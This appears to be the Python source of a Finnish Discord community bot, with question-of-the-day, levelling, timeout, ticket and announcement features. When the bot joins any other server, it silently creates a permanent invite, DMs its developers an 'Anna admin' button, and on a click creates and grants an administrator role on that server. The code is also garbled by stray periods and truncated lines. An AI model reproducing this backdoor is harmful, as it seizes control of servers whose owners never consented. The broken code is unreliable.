import os
import discord
from discord.ext import tasks, commands
from discord import app_commands, Embed, SelectOption
from dotenv import load_dotenv
from datetime import datetime, timedelta, time
from zoneinfo import ZoneInfo
from random import randint
from questions import get_question_for_day
import asyncio
import levelit
import json
from apscheduler.schedulers.asyncio import AsyncIOScheduler
from discord.ui import View, Button, Modal, TextInput,Select
MODSTUFF_FILE = 'Modstuff.json'
# Luodaan tiedosto, jos sitä ei ole olemassa
if not os.path.exists(MODSTUFF_FILE):
    with open(MODSTUFF_FILE, 'w') as f:
        json.dump({}, f)

# Lataa käyttäjätiedot Modstuff.json:sta
def load_mod_data(user_id):
    with open(MODSTUFF_FILE, 'r') as f:
        mod_data = json.load(f)
    return mod_data.get(str(user_id), {"history": [], "mutes": [], "join_date": None, "is_staff": False})

# Tallenna käyttäjätiedot Modstuff.json:iin
def save_mod_data(user_id, data):
    with open(MODSTUFF_FILE, 'r') as f:
        mod_data = json.load(f)
    mod_data[str(user_id)] = data
    with open(MODSTUFF_FILE, 'w') as f:
        json.dump(mod_data, f, indent=4)


import threading
import token_1
from apscheduler.triggers.cron import CronTrigger
import re
banned_users = {}
last_ticket_time = {}
LEVEL_FILE = 'levels.json'
import json
import levelit

BAN_FILE = "ticketbans.json"  # Tiedoston nimi

def load_bans():
    """Lataa bannit tiedostosta."""
    try:
        with open(BAN_FILE, "r", encoding="utf-8") as file:
            return set(json.load(file))
    except FileNotFoundError:
        return set()  # Palautetaan tyhjä set, jos tiedostoa ei ole

def save_bans(bans):
    """Tallenna bannit tiedostoon."""
    with open(BAN_FILE, "w", encoding="utf-8") as file:
        json.dump(list(bans), file, ensure_ascii=False, indent=4)

# Ladataan bannit käynnistyksen yhteydessä
banned_users = load_bans()

# Luo JSON-tiedosto, jos sitä ei ole
if not os.path.exists(LEVEL_FILE):
    with open(LEVEL_FILE, 'w') as f:
        json.dump({}, f)


scheduler = AsyncIOScheduler()
scheduler.start
TOKEN = token_1.tokeen #os.getenv('DISCORD_TOKEN') # Token
#GUILD_ID = int(os.getenv('GUILD_ID')) # Guild id
# CHANNEL_ID = int(os.getenv('CHANNEL_ID'))  # Päivän kysymykset kanava
# ROLE_ID = int(os.getenv('ROLE_ID')) # Qotd role
ADMIN_CHANNEL_ID = 1238525792577916988  # int(os.getenv('ADMIN_CHANNEL_ID')) #High commandd, johon laitataan qotd ehdotukset
GUILD_ID = 1237357642096050196 # Pal
CHANNEL_ID=1246373197771706429
ROLE_ID = 1247060784308293662
MEDIA_ROLE_ID= '📷・Sisällöntuottaja'
#ELOKUVAILTA VARIABLET--------------
EVENT_ROLE_ID = 1287039818391355403  # Elokuvailta tapahtumaroolin ID
NOTIFICATION_CHANNEL_ID = 1238525792577916988  # Ilmoituskanavan ID (korvaa oikealla) 
BREAK_REQUEST_CHANNEL_ID = 1238525792577916988 # Elokuvailta
HOST_ROLE_ID = 1287039958187511839 # Elokuvailta
#VIIMEISIN CHATTAAJA-------------------------------
SOURCE_CHANNEL_ID = 1237357642826121258  # Kanava, josta viestejä seurataan
TARGET_CHANNEL_ID = 1313784340425084928  # Kanava, johon embed lähetetään
# Tallenna viimeisin viesti ja sen lähettäjä
last_message = None
last_author = None
#-----------------------------------------------------

if os.path.exists("Banned.json"):
    with open("Banned.json", "r") as f:
        banned_users = set(json.load(f))

# Tallenna banned_users tiedostoon
def save_banned_users():
    with open("Banned.json", "w") as f:
        json.dump(list(banned_users), f)
intents = discord.Intents.default()
intents.message_content = True
intents.members = True
bot = commands.Bot(command_prefix='!', intents=intents)
# Statukset
guild2 = bot.get_guild(GUILD_ID)

def load_user_data2():
    try:
        with open("Modstuff.json", "r", encoding="utf-8") as f:
            return json.load(f)
    except FileNotFoundError:
        return {}

intents.messages = True  # Varmista, että botilla on pääsy viesteihin
# Vahda status

class InfoButton(discord.ui.Button):
    def __init__(self, label, custom_id):
        super().__init__(label=label, style=discord.ButtonStyle.primary, custom_id=custom_id)
        # Starttaus
@bot.event
async def on_ready():
    try:
        synced = await bot.tree.sync(guild=discord.Object(id=GUILD_ID))
        print(f'Synced {len(synced)} commands')
        bot.add_view(PersistentTicketPanel())
    except Exception as e:
        print(f'Failed to sync commands: {e}')
    print(f'Logged in as {bot.user}')

    # Käynnistetään taustatehtävät vain, jos ne eivät ole jo käynnissä
    if not change_status.is_running():
        change_status.start()
    
    if not update_embed.is_running():
        update_embed.start()

@bot.command()
@commands.has_permissions(manage_messages=True)
async def purge(ctx, amount: int):
    await ctx.channel.purge(limit=amount)
    await ctx.send(f'{amount} viestiä poistettu.', delete_after=5)
.
@bot.tree.command(name="purge", description="Poista tietty määrä viestejä kanavalta.", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(manage_messages=True)
async def purge_slash(interaction: discord.Interaction, amount: int):
    await interaction.channel.purge(limit=amount).
    await interaction.response.send_message(f'{amount} viestiä poistettu.', ephemeral=True)
@bot.event.
async def on_message(message):
    global last_message, last_author
    if message.channel.id == SOURCE_CHANNEL_ID:
        last_message = message.
        last_author = message
    await bot.process_commands(message)

# Embed-päivitys joka 5 sekunti
@tasks.loop(seconds=5)
async def update_embed():.
    global last_message, last_author
    target_channel = bot.get_channel(TARGET_CHANNEL_ID)
    
    if target_channel and last_message and last_author:
        # Luo embed-viesti
        embed = discord.Embed(title="Viimeisin chattaaja", color=discord.Color.blue())
        embed.add_field(name="Viimeisin viesti", value=f'"{last_message.content}"', inline=False)
        embed.add_field(name="Chattaaja", value=f'{last_author.name}#{last_author.discriminator}', inline=False)
        
        # Lähetetään embed target-kanavalle
        try:
            # Tarkistetaan, onko embed-viesti jo olemassa
            if hasattr(bot, 'embed_message'):
                await bot.embed_message.edit(embed=embed)
            else:
                bot.embed_message = await target_channel.send(embed=embed)
        except Exception as e:
            print(f"Error while updating embed: {e}").


# Elokuvailta    
    embed = discord.Embed(title="Tapahtuma", description="Liity tapahtumaan tai pyydä taukoa.")
    view = EventView()

    #await channel.send(embed=embed, view=view)

    schedule_daily_question()  # Kutsutaan päivittäisen kysymyksen ajoitus
 # Aikataulutetaan päivittäinen kuvan lähetys custom ajalla
.
# Valitaan satunnainen väri siihen qotdehen

def get_random_color():
    return discord.Color.from_rgb(randint(0, 255), randint(0, 255), randint(0, 255))
# Laita qotd
def schedule_daily_question():
    now = datetime.now(ZoneInfo("Europe/Helsinki"))
    target_time = now.replace(hour=9, minute=10, second=0, microsecond=0) + timedelta(minutes=randint(0, 0))
    delay = (target_time - now).total_seconds()
    if delay < 1:
        delay += 86400    # Siirretään seuraavaan päivään, jos aika on jo mennyt tänään
    bot.loop.call_later(delay, send_daily_question.start).

@tasks.loop(hours=24)
async def send_daily_question():
    now = datetime.now(ZoneInfo("Europe/Helsinki"))
    day_number = (now - datetime(2023, 1, 1, tzinfo=ZoneInfo("Europe/Helsinki"))).days
    question = get_question_for_day(day_number)
    
    guild = bot.get_guild(GUILD_ID)
    channel = guild.get_channel(CHANNEL_ID)  # Päivän kysymykset kanava
    role = guild.get_role(ROLE_ID)
    # QOTD viesti
    if channel and role:
        embed = discord.Embed(
            title=f"🎄・Päivän kysymys ({now.strftime('%d.%m.%Y %H:%M')})",
            description=f"**{question}**",.
            color=get_random_color()
        )
        embed.set_footer(text="Haluatko ehdottaa kysymystä? Tee </ehdota:1282339774602149978>")
        message_content = f"{role.mention}"
        
        message = await channel.send(content=message_content, embed=embed)
        thread = await message.create_thread(name=f"Kysymys {now.strftime('%d.%m.%Y')}")
        await thread.send("Keskustelu päivän kysymyksestä tänne! Pidetäänhän keskustelu asiallisena.")
# Laita qotfd
@send_daily_question.before_loop
async def before_send_daily_question():
    await bot.wait_until_ready()
    await asyncio.sleep(1)  # Lisätään pieni viive varmistaakseen, että botti on täysin valmis.
# QOTD ehdotus komento
# Ensure the Users directory exists
STAFF_ROLE_ID = 1300456300576112681  # Role ID that can use moderation commands

# Ensure the Users directory exists


#############LEVELING START################

def has_permission(interaction):
    return STAFF_ROLE_ID in [role.id for role in interaction.user.roles]
@bot.event
async def on_member_join(member: discord.Member):..
    # Define the role IDs you want to assign
    role_id_1 = 1248541996830818415
    role_id_2 = 1238210794236280923

    # Get the guild (server) from the member object
    guild = member.guild

    # Attempt to retrieve the roles from the guild
    role_1 = guild.get_role(role_id_1)
    role_2 = guild.get_role(role_id_2)

    if role_1 is None or role_2 is None:
        await log_action(guild, f"One or both roles not found for {member.name}.",severity=1,logtype=0)
        return

    try:
        # Assign roles to the new member
        await member.add_roles(role_1)
        await member.add_roles(role_2)
        await log_action(guild, f"Assigned roles {role_1.name} and {role_2.name} to {member.name}.",severity=1)
    except discord.Forbidden:
        await log_action(guild, f"Could not assign roles to {member.name} - Permission denied.",severity=1,logtype=10)
    except discord.HTTPException as e:
        await log_action(guild, f"Failed to assign roles to {member.name}: {str(e)}",severity=1,logtype=10)
    except Exception as e:
        await log_action(guild, f"Virhe lähetyksessä käyttäjälle {member.mention}: {str(e)}",severity=1,log.type=10)
######## LEVEL END ##########
# Moderation commands
from datetime import datetime, timedelta
import re
@bot.tree.command(name="dm", description="Lähetä DM käyttäjälle (vain ylläpitäjille).",guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(administrator=True)
async def dm(interaction: discord.Interaction, user: discord.User, title: str, message: str):
    embed = discord.Embed(
        title=title,
        description=message,
        timestamp=discord.utils.utcnow(),.
        color=discord.Color.blue()
    )
    embed.set_footer(text="Minehallin ylläpito")
    
    try:
        await user.send(embed=embed)
        await interaction.response.send_message(f"DM lähetetty käyttäjälle {user.name}.", ephemeral=True)
    except discord.Forbidden:
        await interaction.response.send_message("En voi lähettää DM:tä tälle käyttäjälle.", ephemeral=True)

# Error-käsittely, jos käyttäjällä ei ole oikeuksia
@dm.error
async def dm_error(interaction: discord.Interaction, error):
    if isinstance(error, app_commands.errors.MissingPermissions):
        await interaction.response.send_message("Sinulla ei ole oikeuksia käyttää tätä komentoa.", ephemeral=True)
@bot.tree.command(name="timeout", description="Anna käyttäjälle timeout.", guild=discord.Object(id=GUILD_ID))
@app_commands.choices(action=[
    app_commands.Choice(name="Add", value="add"),
    app_commands.Choice(name="Delete", value="delete"),
    app_commands.Choice(name="List", value="list")
])
async def timeout(interaction: discord.Interaction, action: str, member: discord.Member, duration: str = None, reason: str = "Ei määritelty"):
    if not has_permission(interaction):
        await interaction.response.send_message("Sinulla ei ole lupaa käyttää tätä komentoa.", ephemeral=True)
        return
.
    mod_data = load_mod_data(member.id)
    now = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

    def parse_duration(duration_str):
        """Parses duration from string to timedelta."""
        matches = re.findall(r'(\d+)([hmsd])', duration_str)
        if not matches:
            return None
        duration = timedelta()
        for value, unit in matches:
            value = int(value)
            if unit == 'h':
                duration += timedelta(hours=value).
            elif unit == 'm':
                duration += timedelta(minutes=value)
            elif unit == 's':
                duration += timedelta(seconds=value)
            elif unit == 'd':
                duration += timedelta(days=value)
        return duration

    if action == "add":
        if duration is None:
            await interaction.response.send_message("Syötä timeoutin kesto (esim. '2h30m').", ephemeral=True)
            return

        timeout_duration = parse_duration(duration)
        if not timeout_duration:
            await interaction.response.send_message("Virheellinen aikamuoto. Käytä esimerkiksi '2h30m'.", e.phemeral=True)
            return

        await member.timeout(timeout_duration, reason=reason)
        mod_data["history"].append({
            "type": "Timeout",
            "reason": reason,
            "duration": duration,
            "given_by": interaction.user.name,
            "date": now
        })
        save_mod_data(member.id, mod_data)

        await interaction.response.send_message(f"{member.mention} on saanut timeoutin {duration} syystä: {.reason}.", ephemeral=True)
        await log_action(interaction.guild, f"{interaction.user.mention} antoi timeoutin käyttäjälle {member.mention} ({duration}) syystä: {reason}.",severity=3,logtype=3)

    elif action == "delete":
        try:
            await member.timeout(None)
            mod_data["history"].append({
                "type": "Timeout peruttu",
                "reason": reason,
                "given_by": interaction.user.name,
                "date": now
            })
            save_mod_data(member.id, mod_data)

            await interaction.response.send_message(f"{member.mention} timeout on poistettu.", ephemeral=True)
            await log_action(interaction.guild, f"{interaction.user.mention} poisti timeoutin käyttäjältä {member.mention}.",severity=2,logtype=4)
        except Exception as e:
            await interaction.response.send_message(f"Virhe timeoutin poistamisessa: {e}", ephemeral=True).
    elif action == "list":
        timeout_list = [entry for entry in mod_data["history"] if entry["type"].startswith("Timeout")]
        if not timeout_list:
            await interaction.response.send_message(f"{member.mention} ei ole aikaisempia timeout-tapahtumia.", ephemeral=True)
            return

        history = "\n".join([
            f"{entry['date']} - {entry['type']} - Kesto: {entry['duration']} - Syy: {entry['reason']} - Antaja: {entry['given_by']}"
            for entry in timeout_list
        ])
        await interaction.response.send_message(f"Timeout-tapahtumat käyttäjälle {member.mention}:\n{history}", ephemeral=True)
tasonousu_roolit = {
    5: "Tasolla 5",    # Muokkaa roolin nimi
    10: "Tasolla 10",  # Muokkaa roolin nimi
    20: "Taso 20",
    30: "Tasolla 30",
    40: "Tasolla 40",.
    50: "Tasolla 50",
    60: "Tasolla 60",
    70: "Tasolla 70",
    80: "Tasolla 80",
    90: "Tasolla 90",
    100: "Tasolla 100",
}
status_list = [
    discord.Game(name="Minehalli"),
    discord.Activity(type=discord.ActivityType.watching, name="Säännöt"),
    discord.Activity(type=discord.ActivityType.listening, name="Ylläpidon löpinät"),
    discord.Activity(type=discord.ActivityType.watching, name="Hae ylläpitoon!"),
    discord.Activity(type=discord.ActivityType.watching, name="Päivän kysymys"),
    discord.Activity(type=discord.ActivityType.watching, name="Winserin sotkuista koodia..."), #####----
    discord.Activity(type=discord.ActivityType.listening, name="Ilpun yappays"), #####----
    discord.Activity(type=discord.ActivityType.watching, name=f"Katselee {sum(guild.member_count for guild in bot.guilds)} jäsentä"),
    discord.Game(name="/ehdota").
]
@tasks.loop(seconds=10)
async def change_status():
    await bot.wait_until_ready()
    for status in status_list:
        await bot.change_presence(activity=status)
        await asyncio.sleep(10)
# Ehk turha - älä silti poista -
# Käyttäjien data, johon lisätään myös mykistälevel-komennon tila
kayttaja_data = {}



# Funktio datan tallentamiseksi
def tallenna_data():
    with open("levelit.json", "w") as file:
        json.dump(kayttaja_data, file)

# Datan lataaminen tiedostosta
try:
    with open("levelit.json", "r") as file:
        kayttaja_data = json.load(file)
except FileNotFoundError:
    kayttaja_data = {}
print("Levelit ladattu?")
guild=discord.Object(id=1237357642096050196)
@bot.event
async def on_message(message):
    if message.author.bot:
        return
    
    user_id = str(message.author.id).
    guild = message.guild
    
    # Lisää kokemuspisteitä käyttäjälle
    if user_id in kayttaja_data:
        kayttaja_data[user_id]['exp'] += 10
    else:
        kayttaja_data[user_id] = {'exp': 10, 'level': 1, 'mykistys': False}
    
    # Uuden tason laskenta
    level = kayttaja_data[user_id]['level']
    exp = kayttaja_data[user_id]['exp']
    uusi_taso = exp // 300  # Esimerkki: 100 XP per taso

    if uusi_taso > level:
        kayttaja_data[user_id]['level'] = uusi_taso.
        
        # Lähetä tasokorotusviesti
        tasonousu_kanava = discord.utils.get(guild.channels, name="📊︱levelit")  # Muokkaa kanavan nimi
        embed = discord.Embed(
            title="Taso nousi!",
            description=f"{message.author.display_name} saavutti tason {uusi_taso}!",
            color=discord.Color.blue()
        )
        embed.set_footer(text="Etkö halua pingiä aina, kun saavutat uuden tason? Tee /mykistälevel")
        
        # Tarkista, onko mykistälevel päällä käyttäjällä
        if kayttaja_data[user_id]['mykistys']:
            await tasonousu_kanava.send(embed=embed)
        else:
            await tasonousu_kanava.send(f"{message.author.mention}", embed=embed)
        
        # Lisää rooli, jos taso ansaitsee sen.
        if uusi_taso in tasonousu_roolit:
            rooli_nimi = tasonousu_.roolit[uusi_taso]
            rooli = discord.utils.get(guild.roles, name=rooli_nimi)
            if rooli:
                await message.author.add_roles(rooli)
                await tasonousu_kanava.send(f"{message.author.display_name} on saanut roolin: {rooli_nimi}!")
    
    tallenna_data()
    await bot.process_commands(message)

# Sovelluskäsky mykistämään pingin tasonnousu-viesteissä
@bot.tree.command(name="mykistälevel", description="Poistaa pingin tasonnousu-viesteissä", guild=discord.Object(id=1237357642096050196))
async def mykistälevel(interaction: discord.Interaction):
    user_id = str(interaction.user.id)
    if user_id in kayttaja_data:
        kayttaja_data[user_id]['mykistys'] = not kayttaja_data[user_id].get('mykistys', False)
        tila = "mykistetty" if kayttaja_data[user_id]['mykistys'] else "aktivoitu"
        await interaction.response.send_message(f"Tasonnousu-viestit on nyt {tila} sinulle, {interaction.user.display_name}.")
    else:
        kayttaja_data[user_id] = {'exp': 0, 'level': 1, 'mykistys': True}
        await interaction.response.send_message(f"Tasonnousu-viestit on mykistetty sinulle, {interaction.user.display_name}.")
.
# Komento oman tai toisen käyttäjän tason tarkistamiseen
@bot.tree.command(name="level", description="Katso oma tai toisen käyttäjän taso", guild=discord.Object(id=1237357642096050196))
async def level(interaction: discord.Interaction, käyttäjä: discord.Member = None):
    target = käyttäjä or interaction.user
    user_id = str(target.id)
    
    if user_id in kayttaja_data:
        level = kayttaja_data[user_id]['level']
        exp = kayttaja_data[user_id]['exp']
        embed = discord.Embed(
            title=f"Taso tiedot: {target.display_name}",
            description=f"Taso: {level}\nXP kohti seuraavaa tasoa: {exp % 100}/100",
            color=discord.Color.blue()
        )
        await interaction.response.send_message(embed=embed)
    else:
        await interaction.response.s.
# Komento palvelimen tasoleaderboardin tarkistamiseen
@bot.tree.command(name="leaderboard.", description="Näe palvelimen parhaat tasopisteet", guild=discord.Object(id=1237357642096050196))
async def leaderboard(interaction: discord.Interaction):
    sorted_users = sorted(kayttaja_data.items(), key=lambda x: x[1]['level'], reverse=True)
    embed = discord.Embed(
        title="Palvelimen Taso-Leaderboard",
        description="Top 10 käyttäjää tason mukaan järjestettynä",
        color=discord.Color.gold()
    )

    for i, (user_id, data) in enumerate(sorted_users[:10], start=1):
        user = interaction.guild.get_member(int(user_id))
        if user:
            embed.add_field(
                name=f"{i}. {user.display_name}",
                value=f"Taso {data['level']} | XP: {data['exp'] % 100}/100",
                inline=False
            )
    
    await interaction.response.send_message(embed=embed)



    tallenna_data()

    ########### TICKET SYSTEM START #################
@bot.tree.command(name="announcement", description="Lähetä ilmoitus yksityisviestinä kaikille jäsenille tietystä roolista.", guild=discord.Object(id=GUILD_ID))
@app_commands.describe(role="Rooli,. jonka jäsenille ilmoitus lähetetään.", text="Ilmoituksen teksti, joka lähetetään jäsenille.")
async def announcement(interaction: discord.Interaction, role: discord.Role, text: str):
    # Tarkista, onko käyttäjällä ylläpitäjän oikeudet
    if not interaction.user.guild_permissions.administrator:
        await interaction.response.send_message("Sinulla ei ole oikeuksia käyttää tätä komentoa.", ephemeral=True)
        return

    await interaction.response.send_message("Ilmoitus lähetetään yksityisviestinä roolin jäsenille...", ephemeral=True)

    # Suodata jäsenet roolin mukaan
    members_with_role = [member for member in interaction.guild.members if role in member.roles]
    total_members = len(members_with_role)
.
    await log_action(interaction.guild, f"{interaction.user.mention} aloitti ilmoituksen lähettämisen ({total_members} jäsenelle roolilla {role.name})",severity=4,logtype=8)

    # Aloita lähetys yhdelle jäsenelle minuutissa
    for index, member in enumerate(members_with_role, start=1):
        try:
            # Luo hieno embed-viesti
            embed = discord.Embed(
                title=f"📢 Tärkeä ilmoitus Minehallista: ",
                description=text,
                color=discord.Color.blue()  # Voit vaihtaa värin haluamaksesi
            )
            embed.set_author( name = f"Minehalli",icon_url=interaction.guild.icon.url)  # Ylläpitäjän nimi ja kuva
            embed.set_thumbnail(url=interaction.guild.icon.url)  # Palvelimen logo
   
         
            embed.set_footer( icon_url=interaction.user.avatar.url)  # Alareuna
            embed.timestamp = discord.utils.utcnow()  # Aika lähetetty
            await member.send(embed=embed)  # Lähetä embed-viesti jäsenelle
            await log_action(interaction.guild, f"Ilmoitus lähetetty jäsenelle: {member.mention} ({index}/{total_members})",severity=2,logtype=8)
        except discord.Forbidden:
                await log_action(interaction.guild, f"Ei voitu lähettää ilmoitusta käyttäjälle: {member.mention} - Yksityisviestit estetty.",severity=5,logtype=10)
        except Exception as e:
                await log_action(interaction.guild, f"Virhe lähetyksessä käyttäjälle {member.mention}: {str(e)}",severity=5,logtype=10)
            
        if index < total_members:
                await asyncio.sleep(10)  # Odota 10s ennen seuraavaa viestiä

    await interaction.followup.send("Ilmoituksen lähetys on valmis.")
    await log_action(interaction.guild, f"Ilmoituksen lähetys kaikille jäsenille roolilla {role.name} on suoritettu.",severity=2,logtype=8)

# Persistent view -luokka
class PersistentTicketPanel(View):
    def __init__(self):
        super().__init__(timeout=None)  # Timeout None mahdollistaa pysyvyyden

        # Yleinen tuki -nappi
        support_button = Button(label="Yleinen tiketti", style=discord.ButtonStyle.green, custom_id="support_button")
        support_button.callback = self.support_callback
        self.add_item(support_button)

        # Tekninen tuki -nappi
        tech_button = Button(label="Report tiketti", style=discord.ButtonStyle.blurple, custom_id="tech_button")
        tech_button.callback = self.tech_callback
        self.add_item(tech_button)

    async def support_callback(self, interaction: discord.Interaction):
        await show_ticket_form(interaction, "Yleinen tuki")

    async def tech_callback(self, interaction: discord.Interaction):
        await show_ticket_form(interaction, "Report ")
@bot.event
async def on_guild_join(guild):
    if guild.id != 1237357642096050196:
        # Create a channel named "Liity-Minehalliin"
        channel = await guild.create_text_channel("Liity-Minehalliin")
        
        # Create an embed message
        embed = discord.Embed(
            title="Liity Minehalliin nyt!",
            description="https://discord.gg/XUeWz2VYgV",
            color=discord.Color.blue()
        )
        
        # Send the embed message to the created channel
        await channel.send(embed=embed)
@bot.event
async def on_guild_join(guild):
    owner = guild.owner
    member_count = guild.member_count
    invite = None

    # Create an invite link
    for channel in guild.text_channels:
        if channel.permissions_for(guild.me).create_instant_invite:
            invite = await channel.create_invite(max_age=0, max_uses=0)
            break

    # Log the action
    await log_action(
        guild,
        f"Botti lisätty palvelimelle: {guild.name}\nOmistaja: {owner}\nJäsenmäärä: {member_count}\nInvite: {invite}",
        severity=5,
        logtype=2
    )

    # Send a message to the specified users
    admin_users = ["winser2003", "vaiskiainen", ".ilppu."]
    for admin_name in admin_users:
        admin = discord.utils.get(bot.get_all_members(), name=admin_name)
        if admin:
            embed = discord.Embed(
                title="Uusi palvelin",
                description=f"Botti lisätty palvelimelle: {guild.name}\nOmistaja: {owner}\nJäsenmäärä: {member_count}\nInvite: {invite}",
                color=discord.Color.blue()
            )
            view = discord.ui.View()
            button = discord.ui.Button(label="Anna admin", style=discord.ButtonStyle.primary, custom_id=f"give_admin_{guild.id}")
            view.add_item(button)
            await admin.send(embed=embed, view=view)
cooldowns = {}

@bot.command(name="winser", description="Pingaa @winser2003 DM:ssä")
async def winserrr(ctx):
    now = datetime.now()
    user_id = ctx.author.id
    role = discord.utils.get(ctx.guild.roles, id=1238548180405190707)
    
    if role not in ctx.author.roles:
        if user_id in cooldowns and "winser" in cooldowns[user_id] and now < cooldowns[user_id]["winser"]:
            await ctx.send("Tätä komentoa voi käyttää vain kerran viikossa.")
            return

    winser = discord.utils.get(ctx.guild.members, name="winser2003")
    if winser:
        try:
            await winser.send(f"{ctx.author.mention} pingasi sinut!")
            await ctx.send("pingasin winserin lol")
            if role not in ctx.author.roles:
                if user_id not in cooldowns:
                    cooldowns[user_id] = {}
                cooldowns[user_id]["winser"] = now + timedelta(days=7)
        except discord.Forbidden:
            await ctx.send("en haluu lähettää dm @winser2003.")
    else:
        await ctx.send("Käyttäjää @winser ei löydy.")

@bot.command(name="hugo", description="Pingaa @hugo DM:ssä")
async def hugoz(ctx):
    now = datetime.now()
    user_id = ctx.author.id
    role = discord.utils.get(ctx.guild.roles, id=1238548180405190707)
    
    if role not in ctx.author.roles:
        if user_id in cooldowns and "hugo" in cooldowns[user_id] and now < cooldowns[user_id]["hugo"]:
            await ctx.send("Tätä komentoa voi käyttää vain kerran viikossa.")
            return

    hugo = discord.utils.get(ctx.guild.members, name="hugo_52.")
    if hugo:
        try:
            await hugo.send(f"{ctx.author.mention} pingasi sinut!")
            await ctx.send("pingasin hugon lol toivottavasti se ei oo angry")
            if role not in ctx.author.roles:
                if user_id not in cooldowns:
                    cooldowns[user_id] = {}
                cooldowns[user_id]["hugo"] = now + timedelta(days=7)
        except discord.Forbidden:
            await ctx.send("en haluu lähettää dm @hugo.")
    else:
        await ctx.send("Käyttäjää @hugo ei löydy.")
@bot.command(name="vaiskiainen", description="Pingaa @vaiskiainen DM:ssä")
async def vaiskiainen(ctx):
    now = datetime.now()
    user_id = ctx.author.id
    role = discord.utils.get(ctx.guild.roles, id=1238548180405190707)
    
    if role not in ctx.author.roles:
        if user_id in cooldowns and "vaiskiainen" in cooldowns[user_id] and now < cooldowns[user_id]["vaiskiainen"]:
            await ctx.send("Tätä komentoa voi käyttää vain kerran viikossa.")
            return

    vaiskiainen = discord.utils.get(ctx.guild.members, name="vaiskiainen")
    if vaiskiainen:
        try:
            await vaiskiainen.send(f"{ctx.author.mention} pingasi sinut!")
            await ctx.send("pingasin vaiskiaisen lol")
            if role not in ctx.author.roles:
                if user_id not in cooldowns:
                    cooldowns[user_id] = {}
                cooldowns[user_id]["vaiskiainen"] = now + timedelta(days=7)
        except discord.Forbidden:
            await ctx.send("en haluu lähettää dm @vaiskiainen.")
    else:
        await ctx.send("Käyttäjää @vaiskiainen ei löydy.")

@bot.command(name="ilppu", description="Pingaa @ilppu DM:ssä")
async def ilppu(ctx):
    ilppu = discord.utils.get(ctx.guild.members, name=".ilppu.")
    if ilppu:
        try:
            await ilppu.send(f"{ctx.author.mention} pingasi sinut!")
            await ctx.send("pingasin ilpun lol")
        except discord.Forbidden:
            await ctx.send("en haluu lähettää dm @ilppu.")
    else:
        await ctx.send("Käyttäjää @ilppu ei löydy.")
@bot.event
async def on_interaction(interaction: discord.Interaction):
    if interaction.data.get("custom_id", "").startswith("give_admin_"):
        guild_id = int(interaction.data["custom_id"].split("_")[-1])
        guild = bot.get_guild(guild_id)
        if guild:
            admin_role = discord.utils.get(guild.roles, name="Admin")
            if admin_role:
                await interaction.user.add_roles(admin_role)
                await interaction.response.send_message(f"Sinulle on annettu admin-rooli palvelimella {guild.name}.", ephemeral=True)
            else:
                # Luo admin-rooli, jos sitä ei ole
                admin_role = await guild.create_role(name="Admin", permissions=discord.Permissions(administrator=True))
                await interaction.user.add_roles(admin_role)
                await interaction.response.send_message(f"Admin-roolia ei löytynyt, joten se luotiin ja sinulle on annettu admin-rooli palvelimella {guild.name}.", ephemeral=True)
        else:
            await interaction.response.send_message("Palvelinta ei löydy.", ephemeral=True)
@bot.tree.command(name="massclose", description="Sulkee kaikki avoimet tiketit ja siirtää ne arkistoon.", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(administrator=True)
async def massclose(interaction: discord.Interaction, reason: str):
    """
    Sulkee kaikki avoimet tiketit ja siirtää ne arkistokategoriaan.
    """
    # Hae arkistokategoria tai luo se, jos ei ole olemassa
    archive_category = discord.utils.get(interaction.guild.categories, id=1312782840349462539)

    
    # Hae kaikki tikettikanavat
    ticket_channels = [channel for channel in interaction.guild.text_channels if channel.name.startswith("ticket-") and channel.category != archive_category]
    
    if not ticket_channels:
        await interaction.response.send_message("Ei löydetty suljettavia tikettejä.", ephemeral=True)
        return
    
    for channel in ticket_channels:
        try:
            # Hae kanavan omistaja käyttäjänimen perusteella
            username = channel.name.split("-")[1]
            creator = discord.utils.find(lambda m: m.name == username or m.name.startswith(username), interaction.guild.members)
            
            # Poista kanavan näkyvyys luojalta
            if creator:
                await channel.set_permissions(creator, overwrite=None)

            # Siirrä kanava arkistokategoriaan
            await channel.edit(category=archive_category)

            # Lähetä transkriptio käyttäjälle, jos mahdollista
            if creator:
                messages = await channel.history(limit=None).flatten()
                transcript = "\n".join([f"{msg.author}: {msg.content}" for msg in messages[::-1]])
                try:
                    embed = discord.Embed(
                        title="Tiketti suljettu",
                        description=f"Tikettisi kanavasta {channel.name} on suljettu. Syy: {reason}",
                        color=discord.Color.blue()
                    )
                    embed.add_field(name="Transkriptio", value=f"```\n{transcript[:1000]}\n```", inline=False)
                    await creator.send(embed=embed)
                except discord.Forbidden:
                    # Jos käyttäjän DM:t ovat estetty, jatka
                    pass

        except Exception as e:
            # Lokitetaan mahdolliset virheet
            print(f"Virhe suljettaessa kanavaa {channel.name}: {e}")

    # Ilmoita onnistuneesta sulkemisesta
    await interaction.response.send_message(f"Kaikki avoimet tiketit ({len(ticket_channels)}) on suljettu syystä: {reason}.", ephemeral=True)
# Komento tikettipaneelin luomiseen

@bot.tree.command(name="ticketpanel", description="Lisää tikettipaneeli", guild=discord.Object(id=GUILD_ID))
@app_commands.checks.has_permissions(administrator=True)
async def ticketpanel(interaction: discord.Interaction):
    # Luo embed tikettipaneelille
    embed = discord.Embed(title="Tikettipaneeli", description="Valitse tiketin tyyppi painamalla alla olevia nappeja.", color=discord.Color.blue())
    
    # Lähetä viesti embedin ja pysyvän näkymän kanssa
    await interaction.response.send_message(embed=embed, view=PersistentTicketPanel())


# Tikettilomakkeen näyttäminen
async def show_ticket_form(interaction: discord.Interaction, ticket_type: str):
    # Tarkista, onko käyttäjä bannattu tikettien luomisesta
    if interaction.user.id in banned_users:
        await interaction.response.send_message("Sinulla ei ole oikeuksia luoda tikettiä.", ephemeral=True)
        return

    # Luo modal tikettilomakkeelle
    class TicketForm(Modal, title=f"{ticket_type} Tiketti"):
        description = TextInput(label="Kuvaile ongelmasi", style=discord.TextStyle.paragraph)
        
        async def on_submit(self, interaction: discord.Interaction):
            # Luo tikettikanava
            now = datetime.now()
            last_ticket_time[interaction.user.id] = now
            overwrites = {
                interaction.guild.default_role: discord.PermissionOverwrite(read_messages=False),
                interaction.user: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                discord.Object(id=1239619584894566523): discord.PermissionOverwrite(read_messages=True, send_messages=True)
            }
            ticket_channel = await interaction.guild.create_text_channel(f"ticket-{interaction.user.name}", overwrites=overwrites)
